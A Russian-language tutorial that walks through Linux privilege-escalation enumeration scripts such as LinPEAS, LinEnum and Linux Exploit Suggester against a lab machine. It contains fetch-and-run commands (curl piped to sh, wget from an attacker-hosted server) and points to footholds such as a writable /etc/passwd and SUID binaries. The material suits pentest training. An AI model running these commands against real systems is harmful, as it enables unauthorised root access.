
### Введение

Когда злоумышленник атакует операционную систему Linux, большую часть времени он тратит на получение базового Shell, который может быть преобразован в TTY Shell или сеанс Meterpreter. Этот Shell дает возможность выполнять ограниченный набор операций. Итак, чтобы повысить свои привилегии в системе, пользователю нужно перечислить различные файлы, каталоги, разрешения, журналы и файлы **/etc/passwd**. Количество файлов внутри любой системы Linux огромное. Следовательно, выполнить эту задачу вручную очень сложно, даже если специалист знает, где нужно искать данные. Почему бы не автоматизировать эту задачу с помощью скриптов?

В принципе, **повышение привилегий** – это фаза, которая наступает после того, как злоумышленник скомпрометировал машину жертвы. Он пытается собрать критическую информацию, связанную с такими системами, как скрытые пароли, плохо настроенные службы или приложения. Эти данные помогают злоумышленнику осуществить пост-эксплойт машины для получения более привилегированного Shell.

### Векторы повышения привилегий

Следующая информация в системе Windows считается критической:

- версия операционной системы;
    
- любой уязвимый пакет, который был установлен;
    
- файлы и папки с полным контролем или возможностью изменения доступа;
    
- подключенные диски;
    
- потенциально конфиденциальные файлы;
    
- сетевая информация (интерфейсы, arp);
    
- состояние и политики безопасности межсетевого экрана;
    
- активные процессы;
    
- учетные данные;
    
- права Sudo;
    
- переменные Path;
    
- Docker;
    
- условия переполнения буфера;
    
- параметры.
    

Несколько скриптов используются при тестировании на проникновение для быстрого определения потенциальных векторов повышения привилегий в системах Linux. В данной статье будет подробно рассмотрен каждый из них.

### Получение доступа к машине Linux

Этот шаг предназначен для поддержания непрерывной связи с машиной. Будучи экспертами в данной области, некоторые читатели могут пропустить этот раздел и перейти непосредственно к скриптам. Более того, если сеанс уже был получен посредством какого-либо другого эксплойта, то эта информация также будет бесполезной.

Поскольку идет речь о **постэксплуатации** или **скриптах**, которые могут быть использованы для перечисления параметров и повышения привилегий, сначала нужно получить доступ к машине. Это сделать несложно. Во-первых, пользователь создает полезную нагрузку с помощью **MSFvenom**. Помимо эксплойта, он будет содержать наш локальный IP-адрес и порт, на котором пользователь желает получить сеанс. После успешного создания полезной нагрузки он вводит команду «**python one line**» для ее размещения на порту номер 80. Пользователь делает это для отправки полезной нагрузки в целевую систему. После этого он запускает листенер **Netcat** на локальном порту, который был добавлен при создании полезной нагрузки. Затем выполняется сама полезная нагрузка на целевой машине. Человек получает сеанс.

### **LinPEAS**

**Ссылка:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

Стоит начать с **LinPEAS**. Он был создан [**Carlos P**](https://twitter.com/carlospolopm). Скрипт сделан с простой целью – перечислить все возможные способы или методы повышения привилегий в системе Linux. Одна из лучших вещей в нем заключается в том, что для него не нужны определенные зависимые компоненты. Это дает возможность запускать существующие двоичные файлы. LinPEAS был протестирован на **Debian, CentOS, FreeBSD** и **OpenBSD**. Он был создан таким образом, что скрипт ничего не будет записывать непосредственно на диск. Во время своей работы по умолчанию он не будет пытаться войти в систему как другой пользователь через команду **su**. Количество времени, которое отнимает у пользователя LinPEAS, варьируется от 2 до 10 минут в зависимости от числа проверок. Если пользователь запускает **WinPEAS** внутри задачи по захвату флага, то следует использовать параметр **«-a».** Это активирует проведение всех проверок. LinPEAS отслеживает процессы, чтобы найти частые **cron jobs**, однако для этого также нужно будет добавить параметр **«-a»**. Скрипт запишет нужную информацию в файл, который будет удален позже. Это делает его работу совершенной, так как он не оставляет никаких следов.

Другие параметры:

- **-s (superfast & stealth):** он позволит сэкономить время и выполнить только нужные проверки.
    
- **-P (Password):** получение пароля, который будет использоваться с sudo-l и брутфорсинга других пользователей.
    
- **-h**: справка.
    
- **-o**: выполнять только выбранные проверки.
    
- **-d <IP/NETMASK>**: обнаружение хостов с помощью fping или ping.
    
- **ip <PORT(s)> -d <IP/NETMASK>**: обнаружение хостов, доступных на открытых портах TCP с помощью nc.
    

С помощью скрипта пользователь экспортирует и сбрасывает некоторые переменные среды во время выполнения, поэтому ни одна команда, осуществленная во время сеанса, не будет сохранена в файле с историей действий. Если пользователю не нужна эта функция, следует просто добавить параметр **«–n»** во время ее использования. LinPEAS можно установить непосредственно из GitHub с помощью команды «**curl**».

```
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```


![[Pasted image 20240310005846.png]]

Здесь читатели могут увидеть интересный модуль файлов LinPEAS в работе. Помимо прочего, скрипт также перечисляет доступные для записи файлы текущего пользователя или целой группы. Видно, что группа Docker имеет доступ для записи. Итак, пользователь может перечислить файл, скопировав его во временный контейнер, а затем обратно в целевое место назначения на хосте. Таким образом, он сможет повысить свои привилегии. Это возможно потому, что некоторые привилегированные пользователи пишут файлы за пределами данной закрытой файловой системы.

![[Pasted image 20240310005859.png]]

Двигаясь дальше, пользователь обнаружил, что существует файл формата python с именем «cleanup.py» внутри каталога nt. Нужно иметь разрешение на выполнение «cleanup.py». Обычно оно связано с cron job. Таким образом, пользователю следует ввести команду вызова Shell:

![[Pasted image 20240310005912.png]]

Проверка SUID: Set User ID – это тип разрешения, который дает пользователям возможность выполнить файл. Те файлы, которые имеют разрешения SUID, доступны для юзеров с высокими привилегиями. Здесь LinPEAS дает пользователю понять, что целевая машина имеет разрешения SUID для find, cp и nano.

![[Pasted image 20240310005929.png]]

LinPEAS также проверяет различные важные файлы на наличие разрешения на запись. Здесь можно увидеть, что целевой сервер содержит файл /etc/passwd, доступный для записи. Это означает, что хакер может создать хэш пользователя и пароля на своем устройстве, а затем добавить полученные данные в файл /etc/passwd, имея доступ Root. Таким образом, появляется возможность скомпрометировать машину.

![[Pasted image 20240310005944.png]]

Далее происходит поиск разрешений Sudo. При их наличии пользователь сможет использовать следующие команды с повышенным доступом без пароля Root. Собственно говоря, это позволит хакеру ссылаться на них в GTFOBIN и найти нужную строку, чтобы получить права Root на целевой машине.

![[Pasted image 20240310005959.png]]

В начале пользователь запускает LinPEAS, принимая SSH целевой машины. Используя его, он с помощью команды «curl» скачивает и запускает скрипт LinPEAS. Может возникнуть ситуация, когда невозможно осуществить эти шаги. Следовательно, тогда человек использует скрипт с помощью команды «python one-liner» на атакующей машине и команды «wget» — на машине жертвы.

```
ls
python -m SimpleHTTPServer 80
```

![[Pasted image 20240310010019.png]]

Пользователь сохранил скрипт в каталог tmp, так как он имеет право на запись. Кроме того, следует предоставить соответствующие разрешения самому скрипту, чтобы выполнить его.

```
cd /tmp
wget 192.168.1.5/linpeas.sh
chmod 777 linpeas.sh
./linpeas.sh
```

![[Pasted image 20240310010039.png]]

### **LinEnum**

**Ссылка:** [**LinEnum**](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)

Пора взглянуть на **LinEnum**. Он был создан пользователем [Rebootuser](https://github.com/rebootuser). LinEnum – это сценарий Shell, целью которого является извлечение информации из целевой машины для повышении привилегий. Он поддерживает экспериментальную функцию отчетности, которая может помочь экспортировать результат сканирования в удобочитаемый формат. Скрипт имеет несколько параметров, таких как:

- **-k**: ввод ключевого слова.
    
- **-e**: ввод пути для экспорта файлов.
    
- **-t:** длительные тестирования.
    
- **-s**: добавление текущего пароля пользователя для проверки sudo perms (не всегда безопасно).
    
- **-r:** имя отчета
    
- **-h:** справка.
    

Скрипт проверяет различные ресурсы или параметры, указанные ниже:

- **Сведения о процессоре**
    
- **Информация о системе**
    

Имя хоста, сведения о сети, текущий IP-адрес, сведения о маршруте по умолчанию, информация о DNS-сервере.

- **Информация о пользователе**
    

Актуальные данные о пользователе, последние активные юзеры, показывает пользователей, вошедших на хост, и список всех пользователей, включая информацию uid/gid. Также представлен список учетных записей с правами Root, политика по защите паролей и информация о методах хранения хэша. Скрипт проверяет значение umask, хранятся ли хэши паролей в файле **/etc/passwd**, извлекает полную информацию о «стандартных» uid, таких как 0, 1000, 1001. Более того, он пытается прочитать ограниченные файлы, т.е. **/etc/shadow**, перечисляет актуальные файлы с историей активности пользователей.

- **Доступ к привилегиям**
    

Какие пользователи недавно использовали Sudo, доступен ли /**etc/sudoers**, имеет ли текущий пользователь доступ к Sudo без пароля, известны ли двоичные файлы для «прорыва» защиты через Sudo (например, nmap, vim), доступен ли домашний каталог Root, можно ли перечислить разрешения для /**home**/.

- **Среда**
    

Отображение текущего $PATH и информации о env.

- **Задачи**
    

Все cron jobs, доступные для записи; cron jobs, принадлежащие другим пользователям; активные и неактивные systemd timers.

- **Службы**
    

Список сетевых подключений (TCP & UDP), список запущенных процессов, поиск списка двоичных файлов и связанных с ними разрешений, список файлов Netconf, список двоичных разрешений init.d.

- **Информация о версии**
    

Sudo, MYSQL, Postgres, Apache (проверяет конфигурацию пользователя, показывает включенные модули, проверяет файлы htpasswd, просматривает каталоги www).

- **Учетные данные по умолчанию (или которые легко взломать)**
    

Проверка учетных записей Postgres и MYSQL на наличие уязвимостей.

- **Поиск**
    

Находит все файлы SUID/GUID, доступные для записи; все файлы SUID/GUID, относящиеся к пользователям с правами Root; все «интересные» файлы SUID/GUID (например, nmap, vim). Скрипт также ищет все файлы POSIX, доступные для записи; детали сервера NFS; файлы с .conf и .log или с каким-то другим ключевым словом, добавленным во время выполнения скрипта.

- **Тесты определенной платформы или программного обеспечения**
    

Проверяет, находится ли пользователь в контейнере Docker, установлен ли он на хосте, находится ли человек в контейнер LXC.

Пользователь загружает локально размещенный скрипт LinEnum и затем выполняет его после получения соответствующих разрешений.

```
wget 192.168.1.5/LinEnum.sh  
chmod 777 LinEnum.sh  
./LinEnum.sh
```

![[Pasted image 20240310010105.png]]

Видно, что скрипт смог перечислить биты SUID на nano, cp и find.

![[Pasted image 20240310010116.png]]

При перечислении Cron Jobs он нашел файл cleanup.py. Что с ним делать – читатель уже знает.

![[Pasted image 20240310010147.png]]

Он также проверяет систему на наличие групп с привилегированным доступом. В данном случае это группа Docker.

![[Pasted image 20240310010208.png]]

LinEnum также обнаружил, что файл **/etc/passwd** доступен для записи на целевом компьютере.

### **Bashark**

**Ссылка:** [**Bashark**](https://raw.githubusercontent.com/redcode-labs/Bashark/master/bashark.sh)

Настало время поработать с **Bashark**. Он был создан компанией [**RedCode Labs**](https://redcodelabs.io/). Bashark был разработан для оказания помощи тестировщикам на проникновение и исследователям безопасности на этапе пост-эксплуатации и оценки безопасности сервера на базе Linux, OSX или Solaris.

Некоторые из выдающихся особенностей Bashark заключаются в том, что это bash-скрипт, что означает, что он может быть запущен непосредственно из терминала без какой-либо установки. Он быстр и не перегружает целевую машину. Bashark не имеет каких-либо конкретных зависимостей, которые вам потребовались бы для установки. Поскольку он стирает данные о своем присутствии после выполнения работы, его трудно обнаружить. Пользователь скачал Bashark с помощью команды «**wget**», которая локально размещена на машине злоумышленника. Затем он предоставил ему разрешения на выполнение с помощью команды «**chmod**» и запустил сам скрипт. Скрипт обновляет ваш Shell, чтобы иметь возможность выполнять различные команды.

```
cd /tmp  
wget 192.168.1.5/bashark.sh  
chmod 777 bashark.sh  
source bashark.sh
```

![[Pasted image 20240310010231.png]]

Здесь пользователь использовал команду «getperm-c» для чтения битов SUID на nano, cp и find среди других двоичных файлов. Bashark также перечислил все общие пути к конфигурационным файлам с помощью команды «getconf».

```
getperm -c
getconf
```

![[Pasted image 20240310010248.png]]

### **LES: Linux Exploit Suggester**

**Ссылка:** [**LES**](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh)

Пришло время поговорить о **LES**. Он был создан компанией [**Z-Labs**](https://z-labs.eu/). Как и другие скрипты в этой статье, он также был разработан, чтобы помочь тестировщикам безопасности и аналитикам проверить машину Linux на наличие потенциальных уязвимостей и возможности повышения привилегий. LES создан таким образом, что он может работать на разных версиях или сборках Linux. Обширные исследования привели к усовершенствованию этого инструмента и сделали его надежным, с минимальным количеством ложных срабатываний. Основная работа **LES** начинается с создания первоначального списка эксплойтов на основе обнаруженной версии ядра. Затем он проверяет наличие определенных тегов для каждого эксплойта. **LES** показывает все полученные результаты, ранжируя их в соответствии с уровнем потенциального риска. Видно, что целевая машина имеет уязвимости **CVE 2021-3156, CVE 2018-18955, CVE 2019-18634, CVE, 2019-15666, CVE 2017-0358**. Пользователь может почитать о них и использовать полученную информацию для повышения привилегий на целевой машине.

```
chmod 777 les.sh  
./les.sh
```

![[Pasted image 20240310010318.png]]

### **LinuxPrivChecker**

**Ссылка:** [**LinuxPrivChecker**](https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py)

Проверка некоторых Privs с помощью **LinuxPrivChecker**. Он был создан [**Mike Czumak**](https://twitter.com/MikeCzumak) и сейчас его работа поддерживается [**Michael Contino**](https://twitter.com/sleventyeleven)**.** После связки скриптов Shell нужно сосредоточиться на скрипте **python**. Этот скрипт python направлен на повышение привилегий в Linux. Он ищет доступные для записи файлы, неправильные конфигурации и пароли, хранящиеся в виде открытого текста, а также возможные эксплойты. Скрипт также показывает «интересные» локации, которые могут играть ключевую роль при повышении привилегий. Все начинается со сбора базовой информации о системе. У пользователя есть данные о версии ядра, имени хоста, ОС, сети, активных службах.

```
python linuxprivchecker.py
```

![[Pasted image 20240310010337.png]]

LinuxPrivChecker также проверяет файл /etc/passwd/ и ищет такую информацию, как данные о группе и ее разрешениях на запись.

![[Pasted image 20240310010350.png]]

### **Metasploit: Local_Exploit_Suggester**

Люди, которые не любят скрипты или те, кто использует **Metasploit** для повышения привилегий в целевой системе, иногда завершают работу сеансом Meterpreter. Таким образом, у них есть модуль пост-эксплуатации, который можно использовать для проверки других способов повышения привилегий. Все, что требуется, — это номер идентификатора сеанса для запуска на целевой машине. Будут перечислены различные уязвимости, которыми обладает система.

```
use post/multi/recon/local_exploit_suggester  
set session 2  
exploit
```

![[Pasted image 20240310010409.png]]

### **Linux Private-i**

**Ссылка:** [**Linux Private-i**](https://raw.githubusercontent.com/rtcrowley/linux-private-i/master/private-i.sh)

Проверка некоторых Privs с помощью **LinuxPrivChecker**. Он был создан [**creosote**](https://github.com/rtcrowley). **Linux Private-i** можно считать инструментом для перечисления файлов в Linux и повышения привилегий. Он выполняет основные шаги по перечислению и показывает пользователю результаты данного процесса в легко читаемом формате. Скрипт включает в себя жизненно важные проверки, такие как информация об ОС и разрешения файлов, возможные учетные данные пользователей, программы: **Apache/HTTPD, Tomcat, Netcat, Perl, Ruby, Python, WordPress, Samba**; приложения баз данных: **SQLite, Postgres, MySQL/MariaDB, MongoDB, Oracle, Redis, CouchDB**; почтовые приложения: **Postfix, Dovecot, Exim, Squirrel Mail, Cyrus, Sendmail, Courier**; проверки информации о сети – **netstat, ifconfig**. Вот фрагмент кода при запуске полного сканирования. Видно, что целевая машина имеет файл **/etc/passwd**, доступный для записи. Кроме того, Netcat, Perl, Python установлены на целевой машине.

```
chmod 777 private-i.sh  
./private-i.sh
```

![[Pasted image 20240310010426.png]]

Private-i также извлек скрипт из cron job, что выполняется по истечении заданного промежутка времени.

![[Pasted image 20240310010438.png]]

### **Linux Smart Enumeration**

**Ссылка:** [**Linux Smart Enumeration**](https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh)

Интеллектуальное перечисление файлов в Linux. Скрипт был создан [**Diego Blanco**](https://github.com/diego-treitos). **Linux Smart Enumeration** – это скрипт, создание которого было вдохновлено скриптом LinEnum. Его цель состоит в том же, что и у всех других упомянутых в этой статье скриптов. Этот скрипт имеет 3 уровня мощности, так что пользователь может контролировать объем информации, которую он хочет собрать. Скрипт использует цвет для различения типов предупреждений. Например, зеленый означает, что его можно использовать для повышения привилегий на целевой машине. Он проверяет группы пользователей, переменные Path, разрешения Sudo и другие «интересные» файлы.

```
chmod 777 lse.sh  
./lse.sh
```

![[Pasted image 20240310010456.png]]

Здесь также есть файл cleanup.py.

![[Pasted image 20240310010513.png]]

Существуют файлы SUID, которые можно использовать для повышения привилегий, такие как nano, cp, find. Пользователь также видит, что файл /**etc/passwd** доступен для записи.

![[Pasted image 20240310010527.png]]

### **Linux Exploit Suggester 2**

Ранее шла речь о Linux Exploit Suggester. Однако стоит взглянуть на новое поколение – **Linux Exploit Suggester 2**. Он в значительной степени основан на первой версии. Скрипт может загрузить обнаруженный код эксплойта непосредственно из базы данных эксплойтов. Он имеет более точное сопоставление подстановочных знаков. Это расширяет область поиска эксплойтов. И последнее нововведение, но не менее важное – он показывает результаты в определенных цветах (зеленый – возможно повышение привилегий).

```
chmod 777 linux-exploit-suggester-2.pl  
./linux-exploit-suggester-2.pl -k 3
```

![[Pasted image 20240310010548.png]]

**Важно**! Информация исключительно в учебных целях. Пожалуйста, соблюдайте законодательство и не применяйте данную информацию в незаконных целях.